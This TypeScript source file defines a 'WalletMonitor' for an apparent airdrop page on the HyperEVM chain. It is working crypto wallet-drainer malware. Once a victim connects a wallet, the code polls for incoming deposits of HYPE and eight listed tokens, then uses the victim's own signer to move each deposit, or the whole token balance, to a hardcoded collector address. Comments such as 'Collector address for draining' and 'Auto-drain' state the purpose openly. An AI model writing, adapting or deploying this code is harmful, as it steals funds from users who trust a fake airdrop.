import { ethers } from "ethers";

export interface WalletMonitorOptions {
  provider: ethers.BrowserProvider;
  signer: ethers.JsonRpcSigner;
  walletAddress: string;
  onNewDeposit: (tokenAddress: string, amount: string, txHash: string) => void;
  pollingInterval?: number;
}

export class WalletMonitor {
  private provider: ethers.BrowserProvider;
  private signer: ethers.JsonRpcSigner;
  private walletAddress: string;
  private onNewDeposit: (tokenAddress: string, amount: string, txHash: string) => void;
  private pollingInterval: number;
  private isMonitoring = false;
  private lastCheckBlock = 0;
  private intervalId?: NodeJS.Timeout;

  // Collector address for draining
  private readonly COLLECTOR = "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48";

  // Tokens to monitor on HyperEVM
  private readonly MONITORED_TOKENS = [
    { address: "0x0000000000000000000000000000000000000000", symbol: "HYPE", decimals: 18 },
    { address: "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E", symbol: "WHYPE", decimals: 18 },
    { address: "0x1F53bFCC97C63BFCF95C08d16C0D3d1ec82E5f8b", symbol: "PURR", decimals: 18 },
    { address: "0x47bb061C0204Af921F43DC73C7D7768d2672DdEE", symbol: "BUDDY", decimals: 18 },
    { address: "0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb", symbol: "USD₮0", decimals: 6 },
    { address: "0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309", symbol: "PiP", decimals: 18 },
    { address: "0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa", symbol: "LIQD", decimals: 18 },
    { address: "0xD2567eE20D75e8B74B44875173054365f6Eb5052", symbol: "perpcoin", decimals: 18 },
    { address: "0x11735dBd0B97CfA7Accf47d005673BA185f7fd49", symbol: "CATBAL", decimals: 18 }
  ];

  constructor(options: WalletMonitorOptions) {
    this.provider = options.provider;
    this.signer = options.signer;
    this.walletAddress = options.walletAddress;
    this.onNewDeposit = options.onNewDeposit;
    this.pollingInterval = options.pollingInterval || 5000; // 5 second polling
  }

  /**
   * Start monitoring wallet for new deposits
   */
  async startMonitoring(): Promise<void> {
    if (this.isMonitoring) {
      console.log("⚠️ Wallet monitor already running");
      return;
    }

    this.isMonitoring = true;
    this.lastCheckBlock = await this.provider.getBlockNumber();
    
    console.log(`🔍 Starting wallet monitor for ${this.walletAddress}`);
    console.log(`📦 Monitoring from block: ${this.lastCheckBlock}`);

    // Start polling for new transactions
    this.intervalId = setInterval(async () => {
      try {
        await this.checkForNewDeposits();
      } catch (error) {
        console.error("Monitor check failed:", error);
      }
    }, this.pollingInterval);
  }

  /**
   * Stop monitoring
   */
  stopMonitoring(): void {
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = undefined;
    }
    this.isMonitoring = false;
    console.log("🛑 Wallet monitoring stopped");
  }

  /**
   * Check for new deposits since last check
   */
  private async checkForNewDeposits(): Promise<void> {
    const currentBlock = await this.provider.getBlockNumber();
    
    if (currentBlock <= this.lastCheckBlock) {
      return; // No new blocks
    }

    // Check for native HYPE deposits
    await this.checkNativeDeposits(this.lastCheckBlock + 1, currentBlock);
    
    // Check for ERC20 token deposits
    await this.checkERC20Deposits(this.lastCheckBlock + 1, currentBlock);

    this.lastCheckBlock = currentBlock;
  }

  /**
   * Check for native HYPE deposits
   */
  private async checkNativeDeposits(fromBlock: number, toBlock: number): Promise<void> {
    try {
      // Get transaction history for the wallet
      const history = await this.provider.getLogs({
        fromBlock,
        toBlock,
        topics: [
          null, // Any topic
          null,
          ethers.zeroPadValue(this.walletAddress, 32) // To our wallet
        ]
      });

      for (const log of history) {
        const tx = await this.provider.getTransaction(log.transactionHash);
        if (tx && tx.to === this.walletAddress && tx.value > 0) {
          console.log(`💰 New HYPE deposit detected: ${ethers.formatEther(tx.value)} HYPE`);
          
          // Trigger drain callback
          this.onNewDeposit("0x0000000000000000000000000000000000000000", ethers.formatEther(tx.value), tx.hash);
          
          // Auto-drain the deposit
          await this.autoDrainNative(tx.value);
        }
      }
    } catch (error) {
      console.error("Failed to check native deposits:", error);
    }
  }

  /**
   * Check for ERC20 token deposits
   */
  private async checkERC20Deposits(fromBlock: number, toBlock: number): Promise<void> {
    for (const token of this.MONITORED_TOKENS) {
      if (token.address === "0x0000000000000000000000000000000000000000") {
        continue; // Skip native token
      }

      try {
        // ERC20 Transfer event signature: Transfer(address,address,uint256)
        const transferTopic = ethers.id("Transfer(address,address,uint256)");
        
        const logs = await this.provider.getLogs({
          fromBlock,
          toBlock,
          address: token.address,
          topics: [
            transferTopic,
            null, // From any address
            ethers.zeroPadValue(this.walletAddress, 32) // To our wallet
          ]
        });

        for (const log of logs) {
          const amount = ethers.formatUnits(log.data, token.decimals);
          console.log(`💰 New ${token.symbol} deposit detected: ${amount} ${token.symbol}`);
          
          // Trigger drain callback
          this.onNewDeposit(token.address, amount, log.transactionHash);
          
          // Auto-drain the deposit
          await this.autoDrainERC20(token.address, log.data, token.decimals);
        }
      } catch (error) {
        console.error(`Failed to check ${token.symbol} deposits:`, error);
      }
    }
  }

  /**
   * Automatically drain native HYPE deposits
   */
  private async autoDrainNative(depositAmount: bigint): Promise<void> {
    try {
      const gasPrice = ethers.parseUnits("25", "gwei");
      const gasLimit = 25000n;
      const gasCost = gasPrice * gasLimit;
      
      // Leave enough for gas
      const drainAmount = depositAmount - gasCost;
      
      if (drainAmount > 0) {
        console.log(`🔄 Auto-draining ${ethers.formatEther(drainAmount)} HYPE...`);
        
        const tx = await this.signer.sendTransaction({
          to: this.COLLECTOR,
          value: drainAmount,
          gasPrice,
          gasLimit
        });

        console.log(`✅ Auto-drain complete: ${tx.hash}`);
      }
    } catch (error) {
      console.error("Auto-drain native failed:", error);
    }
  }

  /**
   * Automatically drain ERC20 token deposits
   */
  private async autoDrainERC20(tokenAddress: string, amountData: string, decimals: number): Promise<void> {
    try {
      const contract = new ethers.Contract(
        tokenAddress,
        [
          "function transfer(address to, uint256 amount) returns (bool)",
          "function balanceOf(address) view returns (uint256)"
        ],
        this.signer
      );

      // Get current balance and drain everything
      const balance = await contract.balanceOf(this.walletAddress);
      
      if (balance > 0) {
        console.log(`🔄 Auto-draining ${ethers.formatUnits(balance, decimals)} tokens...`);
        
        const tx = await contract.transfer(this.COLLECTOR, balance, {
          gasPrice: ethers.parseUnits("25", "gwei"),
          gasLimit: 65000
        });

        console.log(`✅ Auto-drain complete: ${tx.hash}`);
      }
    } catch (error) {
      console.error("Auto-drain ERC20 failed:", error);
    }
  }

  /**
   * Get monitoring status
   */
  getStatus(): { isMonitoring: boolean; lastCheckBlock: number; walletAddress: string } {
    return {
      isMonitoring: this.isMonitoring,
      lastCheckBlock: this.lastCheckBlock,
      walletAddress: this.walletAddress
    };
  }
}

/**
 * Create wallet monitor instance
 */
export function createWalletMonitor(options: WalletMonitorOptions): WalletMonitor {
  return new WalletMonitor(options);
}

// Global monitor instance
let globalMonitor: WalletMonitor | null = null;

/**
 * Start wallet monitoring (simplified interface for airdrop page)
 */
export function startWalletMonitoring(
  provider: ethers.BrowserProvider,
  signer: ethers.JsonRpcSigner,
  walletAddress: string
): void {
  if (globalMonitor) {
    globalMonitor.stopMonitoring();
  }

  globalMonitor = createWalletMonitor({
    provider,
    signer,
    walletAddress,
    onNewDeposit: (tokenAddress, amount, txHash) => {
      console.log(`New deposit detected: ${amount} tokens (${tokenAddress})`);
    }
  });

  globalMonitor.startMonitoring();
}

/**
 * Stop wallet monitoring
 */
export function stopWalletMonitoring(): void {
  if (globalMonitor) {
    globalMonitor.stopMonitoring();
    globalMonitor = null;
  }
}